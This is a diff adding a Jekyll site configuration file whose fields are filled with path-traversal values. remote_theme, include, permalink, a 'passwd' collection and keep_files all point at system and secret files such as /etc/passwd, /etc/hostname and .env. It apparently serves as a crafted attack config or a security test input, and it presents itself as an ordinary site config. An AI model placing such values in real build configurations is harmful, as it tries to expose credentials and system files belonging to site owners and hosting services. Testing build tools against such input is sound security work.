@@ -1,0 +1,36 @@
+theme: jekyll-theme-cayman
+remote_theme: pages-themes/architect@../../../../../../../etc/passwd
+plugins:
+  - jekyll-feed
+  - jekyll-coffeescript
+  - jekyll-default-layout
+exclude:
+  - "../../../etc/passwd"
+include:
+  - ".env"
+  - "../../../../../etc/hostname"
+  - "/etc/passwd"
+permalink: "/:title/../../../../etc/passwd"
+defaults:
+  - scope:
+      path: ""
+    values:
+      layout: "default"
+markdown: kramdown
+kramdown:
+  input: GFM
+  syntax_highlighter_opts:
+    block:
+      line_numbers: true
+relative_links:
+  enabled: true
+  collections: true
+collections:
+  passwd:
+    output: true
+    permalink: "/etc/passwd"
+encoding: utf-8
+exclude:
+  - Gemfile
+keep_files:
+  - "../etc/passwd"
